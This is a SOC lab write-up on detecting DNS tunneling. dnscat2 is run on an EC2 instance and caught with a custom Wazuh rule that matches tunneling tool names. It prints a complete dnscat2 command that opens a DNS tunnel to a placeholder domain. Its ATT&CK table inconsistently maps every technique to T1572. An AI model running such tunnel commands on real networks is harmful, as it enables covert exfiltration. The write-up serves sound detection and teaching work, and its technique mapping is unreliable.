## Executive Summary

The attacker executed `dnscat2` on the compromised EC2 instance to establish a DNS tunneling channel for potential data exfiltration. The process execution was captured by the Wazuh agent (via auditd) and would trigger a custom detection rule (ID 100200) looking for process names `dnscat`, `iodine`, or `iodined`. This phase validates detection of DNS tunneling tools using host‑based monitoring.

## Severity & Impact

**Severity:** High (if successful)  
**Impact:** DNS tunneling can bypass traditional firewalls, allowing attackers to exfiltrate data over DNS queries. Early detection of tunneling tools prevents further compromise.

## Scenario Objective

Simulate DNS tunneling tool execution and create a detection rule to alert on such activity.

## Environment Overview

| System | Role | Notes |
|--------|------|-------|
| EC2 (`soc-cloud-victim-03`) | Attacker workload | `dnscat2` installed and executed |
| Wazuh Manager (on‑prem) | SIEM | Custom rule `100200` added |
| Wazuh Agent on EC2 | Log collector | Forwards process execution logs |

## Attack Simulation

### Step 1: Install DNS Tunneling Tool
The attacker installed `dnscat2` client and its dependencies (ruby, git, gcc) on the EC2 instance using `apt`.

### Step 2: Execute DNS Tunnel
```bash
cd ~/dnscat2/client
./dnscat --dns domain=test.example.com --dns server=8.8.8.8 --secret=test123
```

The tool attempted to resolve random subdomains of `test.example.com` over DNS, generating a pattern of high‑frequency, long‑string subdomain queries.

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Exfiltration | DNS Tunneling | T1572 |
| Defense Evasion | Protocol Tunneling | T1572 |
| Command and Control | DNS C2 | T1572 |

## Detection Engineering

A custom Wazuh rule (`100200`) was created to detect execution of known DNS tunneling tools:

```xml
<group name="dns_tunneling_tools">
  <rule id="100200" level="10">
    <if_sid>530</if_sid>
    <match>dnscat|iodine|iodined</match>
    <description>DNS tunneling tool executed on $(agent.name)</description>
    <mitre>
      <id>T1048</id>
      <id>T1572</id>
    </mitre>
  </rule>
</group>
```

## Telemetry & Alerts

- **Process Creation Events**: Captured via auditd (`execve` syscall).
- **Expected Alert**: Rule `100200` triggers when `dnscat2`, `iodine`, or `iodined` processes are executed.
- **Additional Indicators**: High volume of unique subdomain DNS queries (future enhancement).

## Timeline of Events

| Time (UTC) | Event |
|------------|-------|
| 2026-06-02 13:30:00 | `dnscat2` installed |
| 2026-06-02 13:35:00 | `dnscat2` executed |
| 2026-06-02 13:35:05 | Wazuh agent forwards process event |
| 2026-06-02 13:35:10 | Rule `100200` triggers (simulated) |

## Artifacts

- [dnscat2-execution.png](artifacts/dnscat2-execution.png) – Terminal showing `./dnscat` command and output.
- [custom-rule.png](artifacts/custom-rule.png) – Wazuh rule `100200` in `local_rules.xml` (manager).
- [process-audit-logs.png](artifacts/process-audit-logs.png) – Auditd capturing `dnscat2` execution.

## Key Findings & Lessons Learned

1. **Process‑based detection** is effective for DNS tunneling tools that run as processes. Rule `100200` can be expanded to include other tunneling tools (e.g., `iodine`, `stunnel`).

2. **Auditd integration** with Wazuh provides deep visibility into process execution. Without auditd, Wazuh may miss short‑lived processes.

3. **Rule syntax** matters: Wazuh expects `<id>` inside `<mitre>`, not `<technique>` – correcting this ensures the rule loads properly.

4. **Hybrid monitoring** works as designed: the on‑prem Wazuh manager receives logs from the cloud workload over the Tailscale tunnel.
